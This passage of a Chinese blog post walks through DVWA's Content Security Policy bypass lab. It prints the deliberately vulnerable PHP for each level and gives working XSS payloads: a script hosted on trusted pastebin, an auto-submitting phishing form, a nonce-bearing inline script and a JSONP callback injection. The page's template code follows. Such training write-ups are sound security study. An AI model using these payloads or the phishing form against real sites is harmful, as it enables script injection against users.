+<li>object-src：不信任任何URL，即不加载任何资源</li>
+<li>style-src样式表：只信任<a target="_blank" rel="noopener" href="http://cdn.example.org和http//third-party.org">http://cdn.example.org和http://third-party.org</a></li>
+<li>child-src：必须使用HTTPS协议加载。这个已从Web标准中删除，新版本浏览器可能不支持。</li>
+<li>其他资源：没有限制其他资源</li>
+</ol>
+<p>当启用CSP后，不符合CSP的外部资源会被阻止加载。</p>
+<p>为什么要使用CSP呢？</p>
+<p>首先，CSP是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行。CSP旨在“作为开发人员可以使用的工具，以各种方式保护其应用程序，减轻内容注入漏洞的风险和减少应用程序执行的特权”。当前，CSP还处在快速的发展期，目前正在进行规范中的版本是CSP3，CSP标准由用户代理选择实现。例如，Chrome具有完整的CSP2支持，并且实现了CSP3的大部分工作草案，仅在某些情况下可能会落后于实验中的某些特性，而Mozilla  Firefox和基于WebKit的浏览器则刚刚获得了完整的CSP2支持。在实际使用中，CSP策略在Content-Security-Policy HTTP响应头或元素中提供。</p>
+<h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+//script-src脚本：&#39;self&#39;只信任当前域名
+//信任https://pastebin.com 、example.com code.jquery.com、//https://ssl.google-analytics.com
+
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // alLows js from self, pastebin.com, jquery and google analytics.
+
+header($headerCSP);
+
+# https://pastebin.com/raw/R570EE00
+
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[ &#39;body&#39; ] .= &quot;
+    &lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;
+    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;
+&lt;/form&gt;
+&#39;;
+</code></pre>
+<p>可以看到被信任的网站有：<a target="_blank" rel="noopener" href="https://pastebin.com、example.com、code.jquery.com和https//ssl.google-analytics.com">https://pastebin.com、example.com、code.jquery.com和https://ssl.google-analytics.com</a></p>
+<p>因此，绕过CSP的方法就是，攻击者把恶意代码保存在受信任的网站上，然后把链接发送给需要攻击的用户，用户点击后，达到注入目的。</p>
+<p>可以在New Paste中写下代码，点击create去创建链接</p>
+<p><img src="D:\blog\source_posts\DVWA：XSS\CSP受信任网站.png" alt="CSP受信任网站"></p>
+<p>点击raw形式(原生)来显示</p>
+<p><img src="D:\blog\source_posts\DVWA：XSS\点击raw形式(原生)来显示,.jpg" alt="点击raw形式(原生)来显示,"></p>
+<p>复制链接</p>
+<p><img src="D:\blog\source_posts\DVWA：XSS\复制链接.png" alt="复制链接"></p>
+<p>当然也可以通过CSRF实现攻击，做一个钓鱼网站，通过发送邮件等方式让用户收到链接后，诱惑点击，用户点击后，则被被攻击。例如如下构造一个钓鱼网站</p>
+<pre><code>&lt;form action=&quot; http://127.0.0.1/dvwa/vulnerabilities/csp/&quot; id=&quot;csp&quot; method=&quot;post&quot;&gt;
+
+&lt;input type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot;/&gt;
+
+&lt;/form&gt;
+
+&lt;script&gt;
+
+var form = document.getElementById(&quot;csp&quot;);
+
+form[0].value=&quot;https://pastebin.com/raw/R570EE00&quot;; form.submit(); 
+
+&lt;/script&gt;</code></pre>
+<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+//增加了nonce
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&quot;;
+
+header($headerCSP);
+
+// Disable XSS protections so that inline alert boxes will work
+header (&quot;X-XSS-Protection: 0&quot;);
+//如果脚本（例如&lt;script nonce=&quot;r@nd0m&quot;&gt;：）标记包含与CSP标头中指定的随机数匹配的随机数属性，则允许执行内联脚本或CSS 。随机数应为安全的随机字符串，并且不应重复使用。
+
+# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;
+
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[ &#39;body&#39; ] .= &quot;
+    &quot; . $_POST[&#39;include&#39;] . &quot;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;
+    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;
+&lt;/form&gt;
+&#39;;
+
+</code></pre>
+<p>http头信息中的script-src的合法来源发生了变化，说明如下</p>
+<ul>
+<li>unsafe-inline，允许使用内联资源，如内联&lt; script&gt;元素，javascript:URL，内联事件处理程序（如onclick）和内联&lt; style&gt;元素。必须包括单引号。</li>
+<li>nonce-source，仅允许特定的内联脚本块，nonce=”TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=”</li>
+</ul>
+<p>现在更加简单了，可以直接输入以下代码</p>
+<p> <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script></p>
+<p>弹出如下信息框，表示注入成功。</p>
+<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><p>high.php</p>
+<pre><code>&lt;?php
+$headerCSP = "Content-Security-Policy: script-src 'self';";
+header($headerCSP);
+?&gt;
+
+&lt;?php
+if (isset ($_POST['include'])) {
+$page[ 'body' ] .= "
+    " . $_POST['include'] . "
+";
+}
+$page[ 'body' ] .= '
+&lt;form name="csp" method="POST"&gt;
+    &lt;p&gt;The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;
+    &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;
+    &lt;input type="button" id="solve" value="Solve the sum" /&gt;
+&lt;/form&gt;
+
+&lt;script src="source/high.js"&gt;&lt;/script&gt;
+';
+
+</code></pre>
+<p>high.js</p>
+<pre><code>function clickButton() {
+    var s = document.createElement("script");
+    s.src = "source/jsonp.php?callback=solveSum";
+    document.body.appendChild(s);
+}
+
+function solveSum(obj) {
+    if ("answer" in obj) {
+        document.getElementById("answer").innerHTML = obj['answer'];
+    }
+}
+
+var solve_button = document.getElementById ("solve");
+
+if (solve_button) {
+    solve_button.addEventListener("click", function() {
+        clickButton();
+    });
+}
+</code></pre>
+<p>这个级别已经没有输入框了，不过题目已经给了足够多的提示。</p>
+<p>首先先看一下 CSP 头，发现只有 <code>script-src 'self';，</code> 看来只允许本界面加载的 javascript 执行。</p>
+<p>然后研究了一下这个点击显示答案的逻辑(逻辑在 <code>source/high.js</code>里), 大致如下: 点击按钮  -&gt; js 生成一个 script 标签(src 指向 source/jsonp.php?callback=solveNum),  并把它加入到 DOM 中 -&gt; js 中定义了一个 solveNum 的函数 -&gt; 因此 script 标签会把远程加载的  solveSum({“answer”:”15”}) 当作 js 代码执行, 而这个形式正好就是调用了 solveSum 函数,  然后这个函数就会在界面适当的位置写入答案。</p>
+<p>一般是没办法修改服务器上的 jsonp.php 文件的，但是在查看服务端源码的时，可以看到下面代码:</p>
+<pre><code>
+if (isset ($_POST['include'])) {
+$page[ 'body' ] .= "
+    " . $_POST['include'] . "
+";
+}</code></pre>
+<p>jsonp.php</p>
+<pre><code>&lt;?php
+header("Content-Type: application/json; charset=UTF-8");
+
+if (array_key_exists ("callback", $_GET)) {
+    $callback = $_GET['callback'];
+} else {
+    return "";
+}
+
+$outp = array ("answer" =&gt; "15");
+
+echo $callback . "(".json_encode($outp).")";
+?&gt;</code></pre>
+<p> callback 参数可以被操控以生成任何你想要得到的结果, 比如 alert, 因此可以构造 Payload: <code>&lt;script src="source/jsonp.php?callback=alert('hacked');"&gt;&lt;/script&gt;</code>, 并把这个当做 include 参数传I给界面就 注入成功!</p>
+<p>或者抓包修改solvesum</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\CSP修改solveSum.png" alt="CSP修改solveSum"></p>
+<p>弹框</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\CSP修改solvesum弹框.png" alt="CSP修改solvesum弹框"></p>
+<h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><p>impossible.php</p>
+<pre><code>&lt;?php
+
+$headerCSP = "Content-Security-Policy: script-src 'self';";
+
+header($headerCSP);
+
+?&gt;
+&lt;?php
+if (isset ($_POST['include'])) {
+$page[ 'body' ] .= "
+    " . $_POST['include'] . "
+";
+}
+$page[ 'body' ] .= '
+&lt;form name="csp" method="POST"&gt;
+    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;
+    &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;
+    &lt;input type="button" id="solve" value="Solve the sum" /&gt;
+&lt;/form&gt;
+
+&lt;script src="source/impossible.js"&gt;&lt;/script&gt;
+';</code></pre>
+<p>impossible.js</p>
+<pre><code>function clickButton() {
+    var s = document.createElement("script");
+    s.src = "source/jsonp_impossible.php";
+    document.body.appendChild(s);
+}
+
+function solveSum(obj) {
+    if ("answer" in obj) {
+        document.getElementById("answer").innerHTML = obj['answer'];
+    }
+}
+
+var solve_button = document.getElementById ("solve");
+
+if (solve_button) {
+    solve_button.addEventListener("click", function() {
+        clickButton();
+    });
+}</code></pre>
+<p>jsonp_impossible.php</p>
+<pre><code>&lt;?php
+header("Content-Type: application/json; charset=UTF-8");
+
+$outp = array ("answer" =&gt; "15");
+
+echo "solveSum (".json_encode($outp).")";
+?&gt;</code></pre>
+<p>该级别主要还是修复了 callback 参数可被控制问题，无法进行攻击</p>
+<h2 id="JavaScript（JS攻击）"><a href="#JavaScript（JS攻击）" class="headerlink" title="JavaScript（JS攻击）"></a>JavaScript（JS攻击）</h2><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+$page[ 'body' ] .= &lt;&lt;&lt;EOF
+&lt;script&gt;
+/*
+MD5 code from here
+https://github.com/blueimp/JavaScript-MD5
+*/
+//省略一些函数
+。。。
+    function generate_token() {
+//id为phrase就是input输入框中的值，将该值md5加密后，作为token进行验证
+        var phrase = document.getElementById("phrase").value;
+        document.getElementById("token").value = md5(rot13(phrase));
+    }
+    generate_token();
+&lt;/script&gt;
+EOF;
+?&gt;</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DOM-XSS%EF%BC%88DOM%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">DOM-XSS（DOM型跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#document-%E5%92%8C-windows-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.0.1.</span> <span class="toc-text">document 和 windows 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#indexOf-%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.2.</span> <span class="toc-text">indexOf()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substring-%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.3.</span> <span class="toc-text">substring() 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#document-write"><span class="toc-number">1.0.4.</span> <span class="toc-text">document.write</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low"><span class="toc-number">1.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium"><span class="toc-number">1.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High"><span class="toc-number">1.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible"><span class="toc-number">1.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reflected-XSS%EF%BC%88%E5%8F%8D%E5%B0%84%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">reflected-XSS（反射型跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-1"><span class="toc-number">2.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-1"><span class="toc-number">2.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%A4%A7%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">1.大写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">2.双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9E%84%E9%80%A0%E4%B8%8D%E4%BD%BF%E7%94%A8"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">3.构造不使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-1"><span class="toc-number">2.3.</span> <span class="toc-text">High</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stored-XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">Stored-XSS（存储型跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-2"><span class="toc-number">3.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#trim-string-charlist"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">trim(string,charlist)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-real-escape-string-string-connection"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">mysql_real_escape_string(string,connection)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stripslashes-string"><span class="toc-number">3.1.0.3.</span> <span class="toc-text">stripslashes(string)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-2"><span class="toc-number">3.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#strip-tags"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">strip_tags()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htmlspecialchars"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">htmlspecialchars()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-3"><span class="toc-number">3.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-3"><span class="toc-number">3.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript%EF%BC%88JS%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">3.5.</span> <span class="toc-text">JavaScript（JS攻击）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-4"><span class="toc-number">3.6.</span> <span class="toc-text">Low</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
